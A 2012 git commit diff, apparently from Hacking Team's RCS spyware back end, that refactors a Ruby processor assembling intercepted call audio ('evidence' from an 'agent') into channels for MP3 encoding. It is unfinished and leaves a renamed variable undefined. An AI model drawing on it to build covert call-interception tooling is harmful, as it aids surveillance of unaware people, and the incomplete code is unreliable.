0587f3ed0ff1f60bca20e7fb7801fa47c903b82b
daniele <d.milan@hackingteam.it>
2012-03-28 16:47:29 +0200

    Call processor work in progress

--- lib/rcs-worker/call_processor.rb
+++ lib/rcs-worker/call_processor.rb
@@ -28,13 +28,14 @@ class Channel
   attr_reader :name, :sample_rate, :start_time, :last_stop_time, :wav_data, :status
   
   def initialize(evidence)
+    @id = BSON::ObjectId.new
     @name = evidence[:data][:channel].to_s
     @sample_rate = evidence[:data][:sample_rate]
     @start_time = evidence[:data][:start_time]
     @last_stop_time = @start_time
     @wav_data = Array.new # array of 32 bit float samples
     @status = :open
-    trace :debug, "CREATING NEW CHANNEL #{@name} #{@start_time}"
+    trace :debug, "[#{@id}] CREATING NEW CHANNEL #{@name} - start_time: #{@start_time} sample_rate: #{@sample_rate}"
   end
   
   def id
@@ -47,7 +48,7 @@ class Channel
   
   def close!
     @status = :closed
-    trace :debug, "Closing channel #{self.id}"
+    trace :debug, "[#{@id}] closing channel #{self.id}"
   end
   
   def closed?
@@ -56,46 +57,37 @@ class Channel
   
   def fill(gap)
     samples_to_fill = @sample_rate * gap
-    #trace :debug, "[#{@name}] filling with #{samples_to_fill} samples(@#{@sample_rate}) to fill #{gap} seconds of missing data."
+    trace :debug, "[#{@id}] filling with #{samples_to_fill} samples(@#{@sample_rate}) to fill #{gap} seconds of missing data."
     @wav_data.concat [0.0] * samples_to_fill.ceil
   end
   
   def time_gap(evidence)
     gap = evidence[:data][:start_time].to_f - @last_stop_time.to_f
-    #trace :debug, "#{@last_stop_time} to #{evidence[:data][:start_time]} => #{gap}"
-    trace :fatal, "*** NEGATIVE GAP ***" if gap < 0
+    trace :debug, "[#{@id}]#{@last_stop_time} to #{evidence[:data][:start_time]} => #{gap}"
+    trace :fatal, "[#{@id}] *** NEGATIVE GAP ***" if gap < 0
     gap
   end
   
   def accept?(evidence)
     if closed? 
-      trace :debug, "CHANNEL IS CLOSED, REFUSING ..."
+      trace :debug, "[#{@id}] CHANNEL IS CLOSED, REFUSING ..."
       return false
     end
     if time_gap(evidence) >= 5.0
-      trace :debug, "TIME GAP IS HIGHER THAN 5 SECONDS !!! REFUSING ..."
+      trace :debug, "[#{@id}] TIME GAP IS HIGHER THAN 5 SECONDS !!! REFUSING ..."
       return false
     end
     return true
-  end
-
-  def end_call?(evidence)
-    return true if evidence[:data][:grid_content].bytesize == 4 and evidence[:data][:grid_content] == "\xff\xff\xff\xff"
   end
   
   def feed(evidence)
     #trace :debug, "Evidence channel #{evidence[:data][:channel]} peer #{evidence[:data][:peer]} with #{evidence[:wav].bytesize} bytes of data."
     
-    if end_call? evidence
-      self.close!
-      return
-    end
-    
     gap = time_gap(evidence)
     fill gap unless gap == 0
     
     @last_stop_time = evidence[:data][:stop_time]
-    trace :debug, "[#{@name}] NEW STOP TIME #{@last_stop_time}"
+    trace :debug, "[#{@id}] NEW STOP TIME #{@last_stop_time}"
     @wav_data.concat evidence[:wav].unpack 'F*' # 16 bit samples
   end
   
@@ -114,26 +106,10 @@ class Channel
   def size
     @wav_data.size
   end
-  
-=begin  
-  def num_samples
-    bytes.to_f / 16
-  end
-  
-  def seconds
-    num_samples.to_f / @sample_rate
-  end
-=end
-  
+
   def to_s
     self.id
   end
-
-=begin  
-  def to_float_samples
-    @wav_data.unpack('F*').spack('S*')
-  end
-=end
 end
 
 class Call
@@ -155,7 +131,7 @@ class Call
     @program = program
     @duration = 0
     @resampled = :not_yet
-    trace :info, "created new call for #{@peer}, starting at #{@start_time}"
+    trace :info, "[#{@id}] created new call for #{@peer}, starting at #{@start_time}"
     @raw_ids = []
 
     @agent = agent
@@ -171,7 +147,7 @@ class Call
   def queueing?
     @channels.size < 2
   end
-  
+
   def accept?(evidence)
     # peer must be the same!
     return false if evidence[:data][:peer] != @peer
@@ -182,6 +158,10 @@ class Call
     
     # if not sure, this is probably another call
     return false
+  end
+
+  def end_call?(evidence)
+    return true if evidence[:data][:grid_content].bytesize == 4 and evidence[:data][:grid_content] == "\xff\xff\xff\xff"
   end
   
   def get_channel(evidence)
@@ -202,7 +182,7 @@ class Call
     # fill in later channel
     if a.size > 1
       fillin_gap = a[1].start_time - a[0].start_time
-      trace :debug, "FILLING #{fillin_gap.to_f} SECS ON CHANNEL #{a[1].name}"
+      trace :debug, "[#{@id}] FILLING #{fillin_gap.to_f} SECS ON CHANNEL #{a[1].name}"
       a[1].fill(fillin_gap)
     end
     
@@ -221,19 +201,30 @@ class Call
     # if evidence is empty or call is closed, refuse feeding
     return false if evidence[:wav].bytesize == 0
     return false if closed?
-    
+
+    if end_call? evidence
+      @channels.each {|c| c.close!}
+      trace :debug, "[#{@id}] closing call for #{@peer}, starting at #{@start_time}"
+      return true
+    end
+
     # get the correct channel for the evidence
     channel = get_channel(evidence)
     #return false if channel.nil?
     
-    trace :debug, "feeding #{evidence[:wav].bytesize} bytes at #{evidence[:data][:start_time]}:#{evidence[:data][:last_stop_time]} to #{channel.id}"
+    trace :debug, "[#{@id}] feeding #{evidence[:wav].bytesize} bytes at #{evidence[:data][:start_time]}:#{evidence[:data][:last_stop_time]} to #{channel.id}"
     channel.feed evidence
     
     # update status
     update_status
     
     unless queueing?
-      sample_rate = (@channels.values.min_by {|c| c.sample_rate}).sample_rate
+      lower_sample_rate = (@channels.values.min_by {|c| c.sample_rate}).sample_rate
+      trace :debug, "[#{@id}] COMMON SAMPLE RATE #{lower_sample_rate}"
+
+      # downsample channel with higher sample rate
+
+
       # take channel with higher sample rate and resample accordingly            
       @encoder ||= ::MP3Encoder.new(2, sample_rate)
       unless @encoder.nil?
@@ -345,11 +336,8 @@ class CallProcessor
   
   def feed(evidence)
     call = get_call evidence
-    unless call.nil?
-      call.feed evidence do |mp3_bytes|
-
-      end
-    end
+    call.feed evidence unless call.nil?
+    nil
   end
   
   def to_s
